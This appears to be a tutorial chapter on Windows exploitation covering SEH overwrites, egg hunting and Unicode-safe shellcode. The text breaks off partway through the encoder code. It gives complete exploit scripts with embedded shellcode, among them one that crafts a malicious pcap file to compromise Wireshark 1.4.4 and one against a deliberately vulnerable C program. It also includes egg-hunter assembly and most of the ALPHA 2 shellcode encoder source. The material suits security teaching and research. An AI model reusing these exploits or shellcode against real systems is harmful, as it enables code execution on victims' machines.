Attacking5.1 - Principles of Exception Handling AttackWe build the following project with VC++//TestException.cpp#include &lt;cstdio&gt;\t//for printf()#include &lt;cstdlib&gt;\t//for system()int main() &#123;\t__try &#123;\t\t__asm&#123;NOP&#125;\t\t*(int*)0 = 0;\t&#125;\t__except(1) &#123;\t\t__asm&#123;NOP&#125;\t\tprintf(&quot;got an exception\\n&quot;);\t&#125;\tsystem(&quot;pause&quot;);&#125;\n\n//TestException2.cpp#include &lt;cstdio&gt;#include &lt;cstdlib&gt;#include &lt;Windows.h&gt;unsigned dummy;EXCEPTION_DISPOSITION__cdeclhandler_function(\tstruct _EXCEPTION_RECORD *ExceptionRecord,\tvoid *EstablisherFrame,\tstruct _CONSTEXT *ContextRecord,\tvoid *DispatcherContext)&#123;\tprintf(&quot;This is our exception handler.&quot;);\tContextRecord-&gt;Eax = (unsigned)&amp;dummy;&#125;int main() &#123;\tunsigned Handler = (unsigned)hander_function;\t__asm &#123;\t\tpush Handler\t// Push Handler into stack.\t\tpush FS:[0]\t\t// Push the address of ExceptionList into stack.\t\tmov FS:[0],ESP\t// move _EXCEPTION_REGISTRATION_RECORD to the beginning of the ExceptionList.\t&#125;\t__asm &#123;\t\tmov eax, 0\t\t// Set EAX to be 0.\t\tmov [eax], 0\t// Set [EAX] to be 0.\t\t/*\t\tThis part of code is equivalent to: *(int*)0 = 0;\t\t*/\t&#125;\tprintf(&quot;After handling\\n&quot;);\t__asm &#123;\t\tmov eax,[ESP]\t// Load Next into EAX\t\tmov FS:[0],EAX\t// Load EAX into ExceptionList\t\tadd esp,8\t\t// Clear stack.\t&#125;\tsystem(&quot;pause&quot;);&#125;\n\n//TestException3.cppint main() &#123;\t__asm &#123;\t\tpush Handler   //Push exception handler into stack.\t\tpush FS:[0]    //Push the current ExceptionList into stack.\t\tmov FS:[0],ESP //Load new _EXCEPTION_REGISTRATION_RECORD into ExceptionList\t&#125;\t*(int*)0 = 0;      //Exception\t__asm &#123;\tHandler:           //Exception handler\t\tINT 3          //Breakpoint\t&#125;&#125;\nOpen TestException3.exe with Immunity Debugger. Press F9 to execute the program. Press Alt+S to show SEH chain after the program thrown the exception:\n\n\n\nPractice - Vulnerable001Here we use Vulnerable001.exe in Chapter 4. The following script is our new attack script://attack-vulnerable001-excp.cpp#include &lt;iostream&gt;#include &lt;string&gt;#include &lt;fstream&gt;using namespace std;#define FILENAME &quot;Vulnerable001_Excp_Exploit.txt&quot;int main() &#123;\tstring junk(1500, &#x27;A&#x27;);\t\tofstream fout(FILENAME, ios::binary);\tfout &lt;&lt; junk;\t\tcout &lt;&lt; &quot;OK: &quot; &lt;&lt; FILENAME &lt;&lt; endl;&#125;Open it with Immunity Debugger and input the path of Vulnerable001-Excp-Exploit.txt:\n\n\n\nPress F9. Our program will be stopped. Press F9 to resume. EIP will be filled with 41414141:\n\n\n\nPress Alt+S to show SEH chain window. Notice that the SEH structure of SEH chain is also filled by 41414141:\n\n\n\nNow, we need to find the offset value with mona (We have done this many many times!):!mona pattern_create 1500\n\n\n\nHandler is replaced by 77423177 while Next is replaced by 42307742.\nCheck the stack (0x0022FFE0):\n\n\n\nNotice that we almost reach the bottom. Which means we are not allowed to fill too much data between Next and Handler. A bunch of 1500 bytes data is meaningless since we cannot put all data into the stack.\nFind the offset of 42307742 (Next):\n\n\n\nAnd the offset of 77423177 (Handler).\n\n\n\nWe modify the attack script://attack-vulnerable001-excp.cpp#include &lt;iostream&gt;#include &lt;string&gt;#include &lt;fstream&gt;using namespace std;#define FILENAME &quot;Vulnerable001_Excp_Exploit.txt&quot;int main() &#123;\tstring junk(1440, &#x27;A&#x27;);\tstring next(&quot;\\xcc\\xcc\\xcc\\xcc&quot;);\tstring handler(&quot;\\xef\\xbe\\xad\\xde&quot;);\t\tofstream fout(FILENAME, ios::binary);\tfout &lt;&lt; junk &lt;&lt; next &lt;&lt; handler;\t\tcout &lt;&lt; &quot;OK: &quot; &lt;&lt; FILENAME &lt;&lt; endl;&#125;\n\n\n\n!mona seh\n\n\n\nFinal attack script://attack-vulnerable001-excp.cpp#include &lt;iostream&gt;#include &lt;string&gt;#include &lt;fstream&gt;using namespace std;#define FILENAME &quot;Vulnerable001_Excp_Exploit.txt&quot;char buf[] = &quot;\\xb8\\xd7\\x13\\x93\\x1c\\xda\\xc3\\xd9\\x74\\x24\\xf4\\x5a\\x31\\xc9&quot;&quot;\\xb1\\x39\\x31\\x42\\x12\\x03\\x42\\x12\\x83\\x15\\x17\\x71\\xe9\\x65&quot;&quot;\\xf0\\xfa\\x12\\x95\\x01\\x65\\x9a\\x70\\x30\\xb7\\xf8\\xf1\\x61\\x07&quot;&quot;\\x8a\\x57\\x8a\\xec\\xde\\x43\\x9d\\x45\\x94\\x4d\\x2a\\xdb\\x01\\xa0&quot;&quot;\\xd3\\x2d\\x92\\x6e\\x17\\x2f\\x6e\\x6c\\x44\\x8f\\x4f\\xbf\\x99\\xce&quot;&quot;\\x88\\x76\\xd7\\x3f\\x44\\xdf\\x9c\\x92\\x79\\x54\\xe0\\x2e\\x7b\\xba&quot;&quot;\\x6e\\x0e\\x03\\xbf\\xb1\\xfb\\xbf\\xbe\\xe1\\x8f\\x08\\xd8\\x8a\\xc8&quot;&quot;\\xa8\\xd9\\x5f\\xb8\\x2d\\x10\\x2b\\x05\\x67\\x93\\x2b\\xfe\\x43\\x58&quot;&quot;\\xd2\\xd7\\x9d\\x9e\\x79\\x16\\x12\\x13\\x83\\x5e\\x95\\xcb\\xf6\\x94&quot;&quot;\\xe5\\x76\\x01\\x6f\\x97\\xac\\x84\\x70\\x3f\\x27\\x3e\\x55\\xc1\\xe4&quot;&quot;\\xd9\\x1e\\xcd\\x41\\xad\\x79\\xd2\\x54\\x62\\xf2\\xee\\xdd\\x85\\xd5&quot;&quot;\\x66\\xa5\\xa1\\xf1\\x23\\x7e\\xcb\\xa0\\x89\\xd1\\xf4\\xb3\\x76\\x8e&quot;&quot;\\x50\\xbf\\x95\\xd9\\xe5\\x40\\x66\\xe6\\xbb\\x56\\x92\\x18\\x44\\xa7&quot;&quot;\\xd0\\x6b\\x21\\xd5\\x29\\xb9\\x87\\x7d\\x22\\xd1\\xd7\\x15\\xf6\\x5e&quot;&quot;\\xfe\\xe2\\xf9\\x75\\x94\\xec\\xed\\x7c\\x69\\xed\\xed\\x3c\\x26\\xab&quot;&quot;\\xcd\\x94\\xdd\\x40\\x7a\\x14\\xf6\\xab\\x82\\x14\\x06\\xfc\\xe7\\x78&quot;&quot;\\x6a\\x93\\xc7\\xf7\\x1d\\x19\\x64\\x93\\xe1\\xb7\\x74\\x33\\xa7\\xc4&quot;&quot;\\x23\\xc4\\xd8\\x1e\\xa1\\xca\\x4e\\x51\\x83\\x68\\xd8\\x6e\\x39&quot;;int main() &#123;\tstring next(&quot;\\xEB\\xF6&quot; &quot;\\x90\\x90&quot;);\t// jmp short -0x88 # NOP x 2\tstring handler(&quot;\\x4d\\x25\\x40\\x00&quot;);\t// 0040254d\tstring shellcode(buf);\tstring second_jumpcode(&quot;\\xE9\\xCF\\xFE\\xFF\\xFF&quot; &quot;\\x90\\x90\\x90&quot;);\t// jmp -0x12c # NOP x 3\tstring nops(1440 - shellcode.size() - second_jumpcode.size(), &#x27;\\x90&#x27;);\t\tofstream fout(FILENAME, ios::binary);\tfout &lt;&lt; nops &lt;&lt; shellcode &lt;&lt; second_jumpcode &lt;&lt; next &lt;&lt; handler;\t\tcout &lt;&lt; &quot;OK: &quot; &lt;&lt; FILENAME &lt;&lt; endl;&#125;\n\n\n\nPractice - Wireshark 1.4.4\n\n\n\n\n\n\nOffset of Handler: 1243Offset of Next: 1239\n!mona seh\n\n\n\nHere we use the address: ‘0x64F98F68’ (Don’t forget to check the bad chars for the address!)\nThus, the attack script is://Filename: attack-wireshark.cpp#include &lt;string&gt;#include &lt;iostream&gt;#include &lt;fstream&gt;using namespace std;typedef long int32;typedef short int16;typedef char int8;typedef unsigned long uint32;typedef unsigned short uint16;typedef unsigned char uint8;//PCAP Global Headertypedef __declspec(align(1)) struct pcap_hdr_s &#123;\tuint32 magic_number;\tuint16 version_major;\tuint16 version_minor;\tint32 thiszone;\tuint32 sigfigs;\tuint32 snaplen;\tuint32 network;&#125; pcap_hdr_t;//PCAP Packet Headertypedef __declspec(align(1)) struct pcaprec_hdr_s &#123;\tuint32 ts_sec;\tuint32 ts_usec;\tuint32 incl_len;\tuint32 orig_len;&#125; pcaprec_hdr_t;size_t const ETHER_ADDR_LEN = 6;//Ethernet II Headertypedef __declspec(align(1)) struct ether_hdr_s &#123;\tuint8 ether_dhost[ETHER_ADDR_LEN];\tuint8 ether_short[ETHER_ADDR_LEN];\tuint16 ether_type;&#125; ether_hdr_t;string const TEMPLATE_FILE = &quot;template.pcap&quot;;string const EXPLOIT_FILE = &quot;exploit.pcap&quot;;char buf[] = &quot;\\xb8\\xd7\\x13\\x93\\x1c\\xda\\xc3\\xd9\\x74\\x24\\xf4\\x5a\\x31\\xc9&quot;&quot;\\xb1\\x39\\x31\\x42\\x12\\x03\\x42\\x12\\x83\\x15\\x17\\x71\\xe9\\x65&quot;&quot;\\xf0\\xfa\\x12\\x95\\x01\\x65\\x9a\\x70\\x30\\xb7\\xf8\\xf1\\x61\\x07&quot;&quot;\\x8a\\x57\\x8a\\xec\\xde\\x43\\x9d\\x45\\x94\\x4d\\x2a\\xdb\\x01\\xa0&quot;&quot;\\xd3\\x2d\\x92\\x6e\\x17\\x2f\\x6e\\x6c\\x44\\x8f\\x4f\\xbf\\x99\\xce&quot;&quot;\\x88\\x76\\xd7\\x3f\\x44\\xdf\\x9c\\x92\\x79\\x54\\xe0\\x2e\\x7b\\xba&quot;&quot;\\x6e\\x0e\\x03\\xbf\\xb1\\xfb\\xbf\\xbe\\xe1\\x8f\\x08\\xd8\\x8a\\xc8&quot;&quot;\\xa8\\xd9\\x5f\\xb8\\x2d\\x10\\x2b\\x05\\x67\\x93\\x2b\\xfe\\x43\\x58&quot;&quot;\\xd2\\xd7\\x9d\\x9e\\x79\\x16\\x12\\x13\\x83\\x5e\\x95\\xcb\\xf6\\x94&quot;&quot;\\xe5\\x76\\x01\\x6f\\x97\\xac\\x84\\x70\\x3f\\x27\\x3e\\x55\\xc1\\xe4&quot;&quot;\\xd9\\x1e\\xcd\\x41\\xad\\x79\\xd2\\x54\\x62\\xf2\\xee\\xdd\\x85\\xd5&quot;&quot;\\x66\\xa5\\xa1\\xf1\\x23\\x7e\\xcb\\xa0\\x89\\xd1\\xf4\\xb3\\x76\\x8e&quot;&quot;\\x50\\xbf\\x95\\xd9\\xe5\\x40\\x66\\xe6\\xbb\\x56\\x92\\x18\\x44\\xa7&quot;&quot;\\xd0\\x6b\\x21\\xd5\\x29\\xb9\\x87\\x7d\\x22\\xd1\\xd7\\x15\\xf6\\x5e&quot;&quot;\\xfe\\xe2\\xf9\\x75\\x94\\xec\\xed\\x7c\\x69\\xed\\xed\\x3c\\x26\\xab&quot;&quot;\\xcd\\x94\\xdd\\x40\\x7a\\x14\\xf6\\xab\\x82\\x14\\x06\\xfc\\xe7\\x78&quot;&quot;\\x6a\\x93\\xc7\\xf7\\x1d\\x19\\x64\\x93\\xe1\\xb7\\x74\\x33\\xa7\\xc4&quot;&quot;\\x23\\xc4\\xd8\\x1e\\xa1\\xca\\x4e\\x51\\x83\\x68\\xd8\\x6e\\x39&quot;;int main() &#123;\tpcap_hdr_t global_header;\tpcaprec_hdr_t packet_header;\tether_hdr_t ether_header;\t\tsize_t const OFFSET_LEN = 1239;\tstring nops(OFFSET_LEN, &#x27;\\x90&#x27;);\tstring next = &quot;\\xEB\\x0A\\x90\\x90&quot;; // JMP SHORT 0x0C (EB0A) # NOPx2\tstring handler = &quot;\\x68\\x8f\\xf9\\x64&quot;; // 64F98F68\tstring slide(50, &#x27;\\x90&#x27;);\tstring shellcode(buf);\t\tstring exploit = nops + next + handler + slide + shellcode; \t\tifstream fin(TEMPLATE_FILE.c_str(), ios::binary);\tfin.read((char*)&amp;global_header, sizeof(global_header)).\t\tread((char*)&amp;packet_header, sizeof(packet_header)).\t\tread((char*)&amp;ether_header, sizeof(ether_header));\t\tpacket_header.incl_len = packet_header.orig_len = sizeof(ether_header) + exploit.size();\t\tether_header.ether_type = 0x2323;\t\tofstream fout(EXPLOIT_FILE.c_str(), ios::binary);\tfout.write((char*)&amp;global_header, sizeof(global_header)).\t\t write((char*)&amp;packet_header, sizeof(packet_header)).\t\t write((char*)&amp;ether_header, sizeof(ether_header))\t\t &lt;&lt; exploit;\t\t \tcout &lt;&lt; &quot;OK: &quot; &lt;&lt; EXPLOIT_FILE &lt;&lt; endl;&#125;\n\n\n\n5.2 - Egg HuntNtDisplayStringloop_inc_page:\tor dx,0x0fffloop_inc_one:\tinc edxloop_check:\tpush edx\tpush 0x43\tpop eax\tint 0x2e\tcmp al,0x05\tpop edxloop_check_8_valid:\tje loop_inc_pageis_egg:\tmov eax,0x50905090\tmov edi,edx\tscasd\tjnz loop_inc_one\tscasd\tjnz loop_inc_onematched:\tjmp edi\nWinDbg:lkd&gt; dds nt!KeServiceDescriptorTable L4\n\nlkd: Local Kernel Debug\ndds: display dword symbol\n\nlkd&gt; dds nt!KiServiceTable\nNtAccessCheckAndAlarmloop_inc_page:\tor dx, 0x0fffloop_inc_one:\tinc edxloop_check:\tpush edx\tpush 0x02\tpop eax\tint 0x2e\tcmp al,0x05\tpop edxloop_check_8_valid:\tje loop_inc_pageis_egg:\tmov eax, 0x50905090\tmov edi,edx\tscasd\tjnz loop_inc_one\tscasd\tjnz loop_inc_onematched:\tjmp edi\nEgg Hunt Practice\n\n\n//vulnerable004.c#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;int main(int argc, char *argv[]) &#123;\tFILE *pFile;\tchar *long_buffer;\tchar short_buf[64];\tprintf(&quot;Vulnerable004 starts...\\n&quot;);\t\tif (argc &gt;= 2) pFile = fopen(argv[1], &quot;r&quot;);\tif (pFile) &#123;\t\tlong_buffer = malloc(2048);\t\tfscanf(pFile, &quot;%s&quot;, long_buffer);\t\t\t\t//do something\t\t\t\tfree(long_buffer);\t\t\t\tfscanf(pFile, &quot;%s&quot;, short_buf);\t&#125;\t\tprintf(&quot;Vulnerable004 ends...\\n&quot;);&#125;\n//attack-vulnerable004.cpp#include &lt;iostream&gt;#include &lt;fstream&gt;#include &lt;string&gt;using namespace std;string const OUTPUT_FILE = &quot;exploit-vulnerable004.txt&quot;;int main() &#123;\tofstream fout(OUTPUT_FILE.c_str());\t\tstring junk1(1000, &#x27;A&#x27;);\tstring junk2(200, &#x27;B&#x27;);\t\tfout &lt;&lt; junk1 &lt;&lt; &#x27;\\n&#x27;\t\t &lt;&lt; junk2 &lt;&lt; endl;\t\t \tcout &lt;&lt; &quot;OK: &quot; &lt;&lt; OUTPUT_FILE &lt;&lt; endl;&#125;\n!mona jmp -r esp\n\n\n\nExploit script://attack-vulnerable004.cpp#include &lt;iostream&gt;#include &lt;fstream&gt;#include &lt;string&gt;using namespace std;string const OUTPUT_FILE = &quot;exploit-vulnerable004.txt&quot;;char eggcode[] = &quot;\\xb8\\xd7\\x13\\x93\\x1c\\xda\\xc3\\xd9\\x74\\x24\\xf4\\x5a\\x31\\xc9&quot;&quot;\\xb1\\x39\\x31\\x42\\x12\\x03\\x42\\x12\\x83\\x15\\x17\\x71\\xe9\\x65&quot;&quot;\\xf0\\xfa\\x12\\x95\\x01\\x65\\x9a\\x70\\x30\\xb7\\xf8\\xf1\\x61\\x07&quot;&quot;\\x8a\\x57\\x8a\\xec\\xde\\x43\\x9d\\x45\\x94\\x4d\\x2a\\xdb\\x01\\xa0&quot;&quot;\\xd3\\x2d\\x92\\x6e\\x17\\x2f\\x6e\\x6c\\x44\\x8f\\x4f\\xbf\\x99\\xce&quot;&quot;\\x88\\x76\\xd7\\x3f\\x44\\xdf\\x9c\\x92\\x79\\x54\\xe0\\x2e\\x7b\\xba&quot;&quot;\\x6e\\x0e\\x03\\xbf\\xb1\\xfb\\xbf\\xbe\\xe1\\x8f\\x08\\xd8\\x8a\\xc8&quot;&quot;\\xa8\\xd9\\x5f\\xb8\\x2d\\x10\\x2b\\x05\\x67\\x93\\x2b\\xfe\\x43\\x58&quot;&quot;\\xd2\\xd7\\x9d\\x9e\\x79\\x16\\x12\\x13\\x83\\x5e\\x95\\xcb\\xf6\\x94&quot;&quot;\\xe5\\x76\\x01\\x6f\\x97\\xac\\x84\\x70\\x3f\\x27\\x3e\\x55\\xc1\\xe4&quot;&quot;\\xd9\\x1e\\xcd\\x41\\xad\\x79\\xd2\\x54\\x62\\xf2\\xee\\xdd\\x85\\xd5&quot;&quot;\\x66\\xa5\\xa1\\xf1\\x23\\x7e\\xcb\\xa0\\x89\\xd1\\xf4\\xb3\\x76\\x8e&quot;&quot;\\x50\\xbf\\x95\\xd9\\xe5\\x40\\x66\\xe6\\xbb\\x56\\x92\\x18\\x44\\xa7&quot;&quot;\\xd0\\x6b\\x21\\xd5\\x29\\xb9\\x87\\x7d\\x22\\xd1\\xd7\\x15\\xf6\\x5e&quot;&quot;\\xfe\\xe2\\xf9\\x75\\x94\\xec\\xed\\x7c\\x69\\xed\\xed\\x3c\\x26\\xab&quot;&quot;\\xcd\\x94\\xdd\\x40\\x7a\\x14\\xf6\\xab\\x82\\x14\\x06\\xfc\\xe7\\x78&quot;&quot;\\x6a\\x93\\xc7\\xf7\\x1d\\x19\\x64\\x93\\xe1\\xb7\\x74\\x33\\xa7\\xc4&quot;&quot;\\x23\\xc4\\xd8\\x1e\\xa1\\xca\\x4e\\x51\\x83\\x68\\xd8\\x6e\\x39&quot;;char huntercode[] =&quot;\\x66\\x81\\xCA\\xFF\\x0F\\x42\\x52\\x6A\\x02\\x58\\xCD\\x2E\\x3C\\x05\\x5A\\x74\\xEF\\xB8&quot;&quot;R0CK&quot;&quot;\\x8B\\xFA\\xAF\\x75\\xEA\\xAF\\x75\\xE7\\xFF\\xE7&quot;;int main() &#123;\tsize_t const RET_OFFSET = 84;\tofstream fout(OUTPUT_FILE.c_str());\t\tstring egg(eggcode);\tstring padding(RET_OFFSET, &#x27;A&#x27;);\tstring ret(&quot;\\x13\\x4f\\x87\\x7c&quot;); //7C874F13\tstring hunter(huntercode);\t\tfout &lt;&lt; &quot;R0CKR0CK&quot; &lt;&lt; egg &lt;&lt; &#x27;\\n&#x27;\t\t &lt;&lt; padding &lt;&lt; ret &lt;&lt; hunter;\t\t \tcout &lt;&lt; &quot;OK: &quot; &lt;&lt; OUTPUT_FILE &lt;&lt; endl;&#125;\nEgg Hunt Practice——Kolibri Web Server5.3 – Unicode-Based Exploitation TechniquesPrincipleA = \\x41 in ASCII representationA = \\x00\\x41 in Unicode (UTF-16LE) representation, where \\x00 is the null byte.\nWhen converting from ASCII to Unicode, values from \\x00 to \\x7F remain unchanged, except that they are prefixed with \\x00.On the other hand, values from \\x80 to \\xFF may be converted differently depending on the code page.\nConsequently, only values from \\x00 to \\x7F are suitable for buffer overflow exploitation, since these values remain consistent across different Windows systems, even when different language settings are used.In contrast, values from \\x80 to \\xFF are unpredictable.\nWe can use Alpha 2 (Berend-Jan Wever) to solve these problem:Alpha 2//Author: Berend-Jan Wever#include &lt;stdio.h&gt; // printf(), fprintf(), stderr#include &lt;stdlib.h&gt; // exit(), EXIT_SUCCESS, EXIT_FAILURE, srand(), rand()#include &lt;string.h&gt; // strcasecmp(), strstr()#include &lt;sys/time.h&gt; //struct timeval, struct timezone, gettimeofday()#define VERSION_STRING &quot;ALPHA 2: Zero-tolerance. (build 07)&quot;#define COPYRIGHT      &quot;Copyright (C) 2003, 2004 by Berend-Jan Wever.&quot;/*________________________________________________________________________________    ,sSSs,,s,  ,sSSSs,  ALPHA 2: Zero-tolerance.   SS&quot;  Y$P&quot;  SY&quot;  ,SY  iS&#x27;   dY       ,sS&quot;   Unicode-proof uppercase alphanumeric shellcode encoding.  YS,  dSb    ,sY&quot;      Copyright (C) 2003, 2004 by Berend-Jan Wever.  `&quot;YSS&#x27;&quot;S&#x27; &#x27;SSSSSSSP   &lt;skylined@edup.tudelft.nl&gt;________________________________________________________________________________  This program is free software; you can redistribute it and/or modify it under  the terms of the GNU General Public License version 2, 1991 as published by  the Free Software Foundation.  This program is distributed in the hope that it will be useful, but WITHOUT  ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS  FOR A PARTICULAR PURPOSE.  See the GNU General Public License for more  details.  A copy of the GNU General Public License can be found at:    http://www.gnu.org/licenses/gpl.html  or you can write to:    Free Software Foundation, Inc.    59 Temple Place - Suite 330    Boston, MA  02111-1307    USA.Acknowledgements:  Thanks to rix for his phrack article on aphanumeric shellcode.  Thanks to obscou for his phrack article on unicode-proof shellcode.  Thanks to Costin Ionescu for the idea behind w32 SEH GetPC code.  Thanks to spoonm for inspiration and suggestions, check out his 1337 perl            conversion of ALPHA in the metasploit framework (with polymorphism!)*/#define mixedcase_w32sehgetpc           &quot;VTX630VXH49HHHPhYAAQhZYYYYAAQQDDDd36&quot; \\                                        &quot;FFFFTXVj0PPTUPPa301089&quot;#define uppercase_w32sehgetpc           &quot;VTX630WTX638VXH49HHHPVX5AAQQPVX5YYYY&quot; \\                                        &quot;P5YYYD5KKYAPTTX638TDDNVDDX4Z4A638618&quot; \\                                        &quot;16&quot;#define mixedcase_ascii_decoder_body    &quot;jAXP0A0AkAAQ2AB2BB0BBABXP8ABuJI&quot;#define uppercase_ascii_decoder_body    &quot;VTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0B&quot; \\                                        &quot;BXP8ACJJI&quot;#define mixedcase_unicode_decoder_body  &quot;jXAQADAZABARALAYAIAQAIAQAIAhAAAZ1AIA&quot; \\                                        &quot;IAJ11AIAIABABABQI1AIQIAIQI111AIAJQYA&quot; \\                                        &quot;ZBABABABABkMAGB9u4JB&quot;#define uppercase_unicode_decoder_body  &quot;QATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5&quot; \\                                        &quot;AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABAB&quot; \\                                        &quot;QI1AIQIAIQI1111AIAJQI1AYAZBABABABAB3&quot; \\                                        &quot;0APB944JB&quot;struct decoder &#123;  char* id; // id of option  char* code; // the decoder&#125; mixedcase_ascii_decoders[] = &#123;  &#123; &quot;nops&quot;,     &quot;IIIIIIIIIIIIIIIIII7&quot; mixedcase_ascii_decoder_body &#125;,  &#123; &quot;eax&quot;,      &quot;PYIIIIIIIIIIIIIIII7QZ&quot; mixedcase_ascii_decoder_body &#125;,  &#123; &quot;ecx&quot;,      &quot;IIIIIIIIIIIIIIIII7QZ&quot; mixedcase_ascii_decoder_body &#125;,  &#123; &quot;edx&quot;,      &quot;JJJJJJJJJJJJJJJJJ7RY&quot; mixedcase_ascii_decoder_body &#125;,  &#123; &quot;ebx&quot;,      &quot;SYIIIIIIIIIIIIIIII7QZ&quot; mixedcase_ascii_decoder_body &#125;,  &#123; &quot;esp&quot;,      &quot;TYIIIIIIIIIIIIIIII7QZ&quot; mixedcase_ascii_decoder_body &#125;,  &#123; &quot;ebp&quot;,      &quot;UYIIIIIIIIIIIIIIII7QZ&quot; mixedcase_ascii_decoder_body &#125;,  &#123; &quot;esi&quot;,      &quot;VYIIIIIIIIIIIIIIII7QZ&quot; mixedcase_ascii_decoder_body &#125;,  &#123; &quot;edi&quot;,      &quot;WYIIIIIIIIIIIIIIII7QZ&quot; mixedcase_ascii_decoder_body &#125;,  &#123; &quot;[esp-10]&quot;, &quot;LLLLLLLLLLLLLLLLYIIIIIIIIIQZ&quot; mixedcase_ascii_decoder_body &#125;,  &#123; &quot;[esp-C]&quot;,  &quot;LLLLLLLLLLLLYIIIIIIIIIIIQZ&quot; mixedcase_ascii_decoder_body &#125;,  &#123; &quot;[esp-8]&quot;,  &quot;LLLLLLLLYIIIIIIIIIIIIIQZ&quot; mixedcase_ascii_decoder_body &#125;,  &#123; &quot;[esp-4]&quot;,  &quot;LLLLYIIIIIIIIIIIIIIIQZ&quot; mixedcase_ascii_decoder_body &#125;,  &#123; &quot;[esp]&quot;,    &quot;YIIIIIIIIIIIIIIIIIQZ&quot; mixedcase_ascii_decoder_body &#125;,  &#123; &quot;[esp+4]&quot;,  &quot;YYIIIIIIIIIIIIIIII7QZ&quot; mixedcase_ascii_decoder_body &#125;,  &#123; &quot;[esp+8]&quot;,  &quot;YYYIIIIIIIIIIIIIIIIQZ&quot; mixedcase_ascii_decoder_body &#125;,  &#123; &quot;[esp+C]&quot;,  &quot;YYYYIIIIIIIIIIIIIII7QZ&quot; mixedcase_ascii_decoder_body &#125;,  &#123; &quot;[esp+10]&quot;, &quot;YYYYYIIIIIIIIIIIIIIIQZ&quot; mixedcase_ascii_decoder_body &#125;,  &#123; &quot;[esp+14]&quot;, &quot;YYYYYYIIIIIIIIIIIIII7QZ&quot; mixedcase_ascii_decoder_body &#125;,  &#123; &quot;[esp+18]&quot;, &quot;YYYYYYYIIIIIIIIIIIIIIQZ&quot; mixedcase_ascii_decoder_body &#125;,  &#123; &quot;[esp+1C]&quot;, &quot;YYYYYYYYIIIIIIIIIIIII7QZ&quot; mixedcase_ascii_decoder_body &#125;,  &#123; &quot;seh&quot;,      mixedcase_w32sehgetpc &quot;IIIIIIIIIIIIIIIII7QZ&quot; // ecx code                mixedcase_ascii_decoder_body &#125;,  &#123; NULL, NULL &#125;&#125;, uppercase_ascii_decoders[] = &#123;  &#123; &quot;nops&quot;,     &quot;IIIIIIIIIIII&quot; uppercase_ascii_decoder_body &#125;,  &#123; &quot;eax&quot;,      &quot;PYIIIIIIIIIIQZ&quot; uppercase_ascii_decoder_body &#125;,  &#123; &quot;ecx&quot;,      &quot;IIIIIIIIIIIQZ&quot; uppercase_ascii_decoder_body &#125;,  &#123; &quot;edx&quot;,      &quot;JJJJJJJJJJJRY&quot; uppercase_ascii_decoder_body &#125;,  &#123; &quot;ebx&quot;,      &quot;SYIIIIIIIIIIQZ&quot; uppercase_ascii_decoder_body &#125;,  &#123; &quot;esp&quot;,      &quot;TYIIIIIIIIIIQZ&quot; uppercase_ascii_decoder_body &#125;,  &#123; &quot;ebp&quot;,      &quot;UYIIIIIIIIIIQZ&quot; uppercase_ascii_decoder_body &#125;,  &#123; &quot;esi&quot;,      &quot;VYIIIIIIIIIIQZ&quot; uppercase_ascii_decoder_body &#125;,  &#123; &quot;edi&quot;,      &quot;WYIIIIIIIIIIQZ&quot; uppercase_ascii_decoder_body &#125;,  &#123; &quot;[esp-10]&quot;, &quot;LLLLLLLLLLLLLLLLYII7QZ&quot; uppercase_ascii_decoder_body &#125;,  &#123; &quot;[esp-C]&quot;,  &quot;LLLLLLLLLLLLYIIII7QZ&quot; uppercase_ascii_decoder_body &#125;,  &#123; &quot;[esp-8]&quot;,  &quot;LLLLLLLLYIIIIII7QZ&quot; uppercase_ascii_decoder_body &#125;,  &#123; &quot;[esp-4]&quot;,  &quot;LLLL7YIIIIIIIIQZ&quot; uppercase_ascii_decoder_body &#125;,  &#123; &quot;[esp]&quot;,    &quot;YIIIIIIIIII7QZ&quot; uppercase_ascii_decoder_body &#125;,  &#123; &quot;[esp+4]&quot;,  &quot;YYIIIIIIIIIIQZ&quot; uppercase_ascii_decoder_body &#125;,  &#123; &quot;[esp+8]&quot;,  &quot;YYYIIIIIIIII7QZ&quot; uppercase_ascii_decoder_body &#125;,  &#123; &quot;[esp+C]&quot;,  &quot;YYYYIIIIIIIIIQZ&quot; uppercase_ascii_decoder_body &#125;,  &#123; &quot;[esp+10]&quot;, &quot;YYYYYIIIIIIII7QZ&quot; uppercase_ascii_decoder_body &#125;,  &#123; &quot;[esp+14]&quot;, &quot;YYYYYYIIIIIIIIQZ&quot; uppercase_ascii_decoder_body &#125;,  &#123; &quot;[esp+18]&quot;, &quot;YYYYYYYIIIIIII7QZ&quot; uppercase_ascii_decoder_body &#125;,  &#123; &quot;[esp+1C]&quot;, &quot;YYYYYYYYIIIIIIIQZ&quot; uppercase_ascii_decoder_body &#125;,  &#123; &quot;seh&quot;,      uppercase_w32sehgetpc &quot;IIIIIIIIIIIQZ&quot; // ecx code                uppercase_ascii_decoder_body &#125;,  &#123; NULL, NULL &#125;&#125;, mixedcase_ascii_nocompress_decoders[] = &#123;  &#123; &quot;nops&quot;,     &quot;7777777777777777777777777777777777777&quot; mixedcase_ascii_decoder_body &#125;,  &#123; &quot;eax&quot;,      &quot;PY777777777777777777777777777777777QZ&quot; mixedcase_ascii_decoder_body &#125;,  &#123; &quot;ecx&quot;,      &quot;77777777777777777777777777777777777QZ&quot; mixedcase_ascii_decoder_body &#125;,  &#123; &quot;edx&quot;,      &quot;77777777777777777777777777777777777RY&quot; mixedcase_ascii_decoder_body &#125;,  &#123; &quot;ebx&quot;,      &quot;SY777777777777777777777777777777777QZ&quot; mixedcase_ascii_decoder_body &#125;,  &#123; &quot;esp&quot;,      &quot;TY777777777777777777777777777777777QZ&quot; mixedcase_ascii_decoder_body &#125;,  &#123; &quot;ebp&quot;,      &quot;UY777777777777777777777777777777777QZ&quot; mixedcase_ascii_decoder_body &#125;,  &#123; &quot;esi&quot;,      &quot;VY777777777777777777777777777777777QZ&quot; mixedcase_ascii_decoder_body &#125;,  &#123; &quot;edi&quot;,      &quot;WY777777777777777777777777777777777QZ&quot; mixedcase_ascii_decoder_body &#125;,  &#123; &quot;[esp-10]&quot;, &quot;LLLLLLLLLLLLLLLLY777777777777777777QZ&quot; mixedcase_ascii_decoder_body &#125;,  &#123; &quot;[esp-C]&quot;,  &quot;LLLLLLLLLLLLY7777777777777777777777QZ&quot; mixedcase_ascii_decoder_body &#125;,  &#123; &quot;[esp-8]&quot;,  